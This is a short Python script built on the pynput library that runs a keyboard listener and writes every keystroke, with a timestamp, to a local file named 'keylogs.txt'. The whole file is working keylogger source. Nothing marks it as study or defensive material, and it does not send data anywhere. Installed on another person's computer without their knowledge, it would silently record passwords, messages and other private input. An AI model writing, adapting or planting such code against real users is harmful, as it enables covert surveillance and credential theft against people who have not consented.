from pynput.keyboard import Key, Listener
import logging

dir = ''

logging.basicConfig(filename=dir + 'keylogs.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
	logging.info(str(key))
	
with Listener(on_press=on_press) as listener:
	listener.join()